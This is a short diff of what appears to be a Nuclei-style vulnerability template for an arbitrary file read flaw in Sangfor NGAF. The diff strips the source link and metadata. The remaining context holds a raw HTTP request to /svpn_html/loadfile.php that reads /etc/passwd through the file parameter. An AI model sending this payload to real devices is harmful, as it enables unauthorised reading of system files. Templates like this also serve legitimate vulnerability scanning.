@@ -3,12 +3,8 @@ info:
   name: 深信服 NGAF任意文件读取漏洞
   author: hacktwo
   severity: high
-  description: '来源: 语雀漏洞知识库 https://www.yuque.com/hacktwo/dtdx2v/tgwq5gfh0cpuho5d'
+  description: ''
   tags: lfi,2024
-  metadata:
-    source: yuque-hacktwo-dtdx2v
-    doc-slug: tgwq5gfh0cpuho5d
-    fofa: 暂无
 http:
 - raw:
   - 'GET /svpn_html/loadfile.php?file=/etc/./passwd HTTP/1.1
